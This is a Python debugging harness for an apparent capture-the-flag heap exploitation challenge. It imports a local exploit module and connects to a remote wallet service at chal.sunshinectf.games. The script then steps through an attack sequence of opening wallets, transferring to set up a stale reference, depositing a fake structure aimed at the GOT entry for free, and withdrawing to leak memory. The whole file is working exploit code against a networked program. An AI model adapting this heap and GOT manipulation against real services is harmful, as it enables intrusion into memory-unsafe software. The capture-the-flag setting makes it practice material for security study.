import sys, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.argv = ["x"]
import importlib.util
spec = importlib.util.spec_from_file_location("ex", "exploit.py")
ex = importlib.util.module_from_spec(spec)
spec.loader.exec_module.__self__ if False else spec.loader.exec_module(ex)
R, open_wallet, transfer, deposit, withdraw, fake_struct, GOT, U64 = (
    ex.Remote, ex.open_wallet, ex.transfer, ex.deposit, ex.withdraw, ex.fake_struct, ex.GOT, ex.U64)

r = R("chal.sunshinectf.games", 26004)
r.pump(1.5)
print("== banner+menu:", repr(r.buf[-120:]))
r.buf = b""

def step(tag, fn, *a):
    out = fn(*a)
    print(f"-- {tag}: {out!r}"[:600])
    return out

step("open A", open_wallet, r, b"A", 48)
step("open C", open_wallet, r, b"C", 48)
step("transfer 0->1", transfer, r, 0, 1)
step("open B", open_wallet, r, b"B", 48)
step("list", lambda: r.send(6, b">>>"))
step("deposit fs into 1", deposit, r, 1, fake_struct(GOT["free"], 48))
step("list2", lambda: r.send(6, b">>>"))
print("== withdraw raw from wallet 2:")
r.send(3, b"Withdraw from which wallet?")
r.send(2, b"bytes):")
r.pump(1.0)
print("   buffer after prompt:", repr(r.buf))
r.buf = b""
r.send(0, b">>>") if False else None
